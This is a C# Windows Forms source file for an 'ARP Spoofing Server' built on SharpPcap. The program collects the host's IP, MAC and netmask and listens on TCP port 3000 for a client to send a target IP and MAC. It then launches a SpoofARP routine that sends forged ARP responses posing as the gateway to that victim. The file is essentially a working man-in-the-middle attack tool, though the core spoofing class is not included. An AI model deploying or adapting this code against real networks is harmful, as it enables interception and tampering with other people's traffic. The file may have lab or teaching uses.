using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Threading;
using System.Timers;
using SharpPcap;
using SharpPcap.LibPcap;
using SharpPcap.WinDivert;
using PacketDotNet;
using System.Net;
using ARP_Spoofing_Server.ObjectSerializer;
using System.Net.Sockets;

namespace ARP_Spoofing_Server
{
    public partial class ARP_Spoofing_Server : Form
    {
        System.Timers.Timer timer = new System.Timers.Timer();

        private List<NetAddress> existData;
        private IObjectSerializable serializer;
        private DeviceData deviceData;
        private NetAddress target;
        string targetIp = "";
        string targetMac = "";
        private bool isGettingTarget;
        private readonly object Locker = new object();
        static Socket socketListener;
        public ARP_Spoofing_Server()
        {
            InitializeComponent();
            #region Source Initialize
            /* get ip config */
            try
            {
                // Retrieve the device list
                var devices = LibPcapLiveDeviceList.Instance;
                string myIp = "";
                string mac = "";
                string netClass = "";
                string mask = "";
                LibPcapLiveDevice device;

                existData = new List<NetAddress>();
                serializer = new JsonObjectSerializer();

                // If no devices were found print an error
                if (devices.Count < 1)
                {
                    WriteToLogFile("No devices were found on this machine");
                    return;
                }
                device = devices[0]; // Default0: ether Mac

                /* Get net class and subnet mask */
                var hostName = Dns.GetHostName();
                foreach (var ip in Dns.GetHostEntry(hostName).AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        myIp = ip.ToString();
                    }
                }
                netClass = GetIPClass(myIp).ToString();
                mask = string.Join("", device.Addresses.Select(x => x.Netmask));

                /* Hex form: xx.xx.xx.xx.xx.xx */
                mac = ToHexMacString(device.Interface.MacAddress);

                /* Write ipconfig to log file */
                WriteToLogFile($"\nMy IP is {netClass} Class: {myIp}");
                WriteToLogFile($"MacAddress: {mac}");
                WriteToLogFile($"Subnet mask: {mask}");

                /* Initialize device data */
                deviceData = new DeviceData()
                {
                    Addr = new NetAddress(myIp, mac),
                    Device = device,
                    Mask = mask
                };
                target = new NetAddress("", "");
            }
            catch (Exception e)
            {
                WriteToLogFile($"Initialize Exception: {e.ToString()}");
            }
            #endregion
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            textBox1.Text = deviceData.Addr.IP;
            textBox2.Text = deviceData.Addr.MAC;
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button_listen_Click(object sender, EventArgs e) //Listen
        {
            Listen.Enabled = false;
            MessageBox.Show("Start to listen 3000 port");

            ServerEnd(3000, 10);
            Thread th = new Thread(ServerSocket);
            th.Start(socketListener);
            while (true)
            {
                lock (Locker)
                {
                    if (!isGettingTarget)
                    {
                        continue;
                    }
                    textBox4.Text = targetIp;
                    textBox3.Text = targetMac;
                    break;
                }
            }
        }

        /// <summary>
        /// Server end point
        /// </summary>
        /// <param name="myPort">Port number</param>
        /// <param name="allowNum">Allow number</param>
        private void ServerEnd(int myPort, int allowNum)
        {
            socketListener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
            IPAddress ip = IPAddress.Any;
            //IPAddress ip = IPAddress.Parse("127.0.0.1");
            int port = myPort;
            IPEndPoint point = new IPEndPoint(ip, port);
            socketListener.Bind(point);
            WriteToLogFile("Listening...");
            socketListener.Listen(allowNum);
        }

        private void ServerSocket(object obListener)
        {
            Socket temp = (Socket)obListener;

            while (true)
            {
                Socket socketSender = temp.Accept();
                WriteToLogFile(("Client IP = " + socketSender.RemoteEndPoint.ToString()) + " Connect Succese!");

                Thread ReceiveMsg = new Thread(ReceiveMsgClient);
                ReceiveMsg.IsBackground = true;
                ReceiveMsg.Start(socketSender);
                //Thread SendToClient = new Thread(SendMsgToClient);
                //SendToClient.Start(socketSender);
            }

        }

        private void SendMsgToClient(object mySocketSender)
        {
            Socket socketSender = mySocketSender as Socket;

            while (true)
            {
                if (socketSender.RemoteEndPoint == null)
                {
                    WriteToLogFile("socketSender.RemoteEndPoint == null");
                    break;
                }
                string msg = "This is Server\n";

                byte[] buffer = Encoding.UTF8.GetBytes(msg);

                socketSender.Send(buffer);
            }

        }

        private async void ReceiveMsgClient(object mySocketSender)
        {
            Socket socketSender = mySocketSender as Socket;
            NetAddress na;

            while (true)
            {

                byte[] buffer = new byte[1024];

                int rece = socketSender.Receive(buffer);

                if (rece == 0)
                {
                    WriteToLogFile(string.Format("Client : {0} + 下線了", socketSender.RemoteEndPoint.ToString()));
                    break;
                }
                string clientMsg = Encoding.UTF8.GetString(buffer, 0, rece);
                try
                {
                    na = serializer.Deserialize<NetAddress>(clientMsg);
                    WriteToLogFile($"Client : IP-{na.IP} MAC-{na.MAC}");
                    MessageBox.Show($"Start to ARP spoofing target: IP-{na.IP} / MAC-{na.MAC}");
                    lock (Locker)
                    {
                        if (isGettingTarget) continue;
                        targetIp = na.IP;
                        targetMac = na.MAC;
                        isGettingTarget = true;

                    }
                    MessageBox.Show($"await ARP Spoofing");
                    //ARP Spoofing
                    await ARPSpoofing(na.IP, na.MAC);
                }
                catch (Exception e)
                {
                    WriteToLogFile($"ARPSpoofing Exception: {e.Message}");

                }
            }
        }
        async Task ARPSpoofing(string ip, string mac)
        {
            deviceData.Device.Open();
            var gatway = deviceData.Device.Interface.GatewayAddresses[0].ToString();
            SpoofARP ArpSpoofer = new SpoofARP(deviceData.Device, ip, ToPhysicalAddressString(mac), gatway, ToPhysicalAddressString(deviceData.Addr.MAC));

            await Task.Run(() =>
            {
                try
                {
                    ArpSpoofer.SendArpResponsesAsync();
                }
                catch (Exception e)
                {
                    WriteToLogFile($"ARPSpoofing Exception: {e.Message}");
                }
            });
        }


        /// <summary>
        /// Reformat from PhysicalAddress into Hex String: xx.xx.xx.xx.xx.xx
        /// </summary>
        /// <param name="physicalAddress"></param>
        /// <returns>xx.xx.xx.xx.xx.xx</returns>
        public static string ToHexMacString(System.Net.NetworkInformation.PhysicalAddress physicalAddress)
        {
            var mac = "";
            byte[] addr = physicalAddress.GetAddressBytes();

            foreach (var value in addr)
            {
                if (value != addr.Last())
                {
                    mac += Convert.ToString(value, 16);
                    mac += ".";
                }
                else
                {
                    mac += Convert.ToString(value, 16);
                }
            }
            return mac;
        }

        public string ToPhysicalAddressString(string HexMac)
        {
            var mac = "";
            string[] HexMacValues = HexMac.Split('.');
            foreach (var value in HexMacValues)
            {
                mac += value;
            }
            return mac;
        }

        /// <summary>
        /// Get IP class
        /// </summary>
        /// <param name="IP"></param>
        /// <returns>A, B, C... Class</returns>
        public static IPClass GetIPClass(string IP)
        {
            if (!string.IsNullOrEmpty(IP) && IP.Split('.').Length == 4 &&
                !string.IsNullOrEmpty(IP.Split('.').Last()))
            {
                string ipclassstr = IP.Split('.').First();
                int ipclasssnum = int.Parse(ipclassstr);
                if (0 <= ipclasssnum && ipclasssnum <= 126)
                {
                    return IPClass.A;
                }
                if (128 <= ipclasssnum && ipclasssnum <= 191)
                {
                    return IPClass.B;
                }
                if (192 <= ipclasssnum && ipclasssnum <= 223)
                {
                    return IPClass.C;
                }
                if (224 <= ipclasssnum && ipclasssnum <= 239)
                {
                    return IPClass.D;
                }
                if (240 <= ipclasssnum && ipclasssnum <= 255)
                {
                    return IPClass.E;
                }
            }
            else return IPClass.notDetected;
            return IPClass.notDetected;
        }

        /// <summary>
        /// Write exist data to xml file
        /// </summary>
        /// <param name="Message"></param>
        public static void WriteToLogFile(string Message)
        {
            try
            {
                string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
                if (!Directory.Exists(path))
                {
                    Directory.CreateDirectory(path);
                }
                string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
                if (!File.Exists(filepath))
                {
                    // Create a file to write to.
                    using (StreamWriter sw = File.CreateText(filepath))
                    {
                        sw.WriteLine(Message);
                    }
                }
                else
                {
                    using (StreamWriter sw = File.AppendText(filepath))
                    {
                        sw.WriteLine(Message);
                    }
                }
            }
            catch { }
        }

        public static void WriteToJsonFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ExistData_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".json";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }
    }
    public enum IPClass { A, B, C, D, E, notDetected }
    public class DeviceData
    {
        public NetAddress Addr;
        public LibPcapLiveDevice Device;
        public string Mask;
    }
}
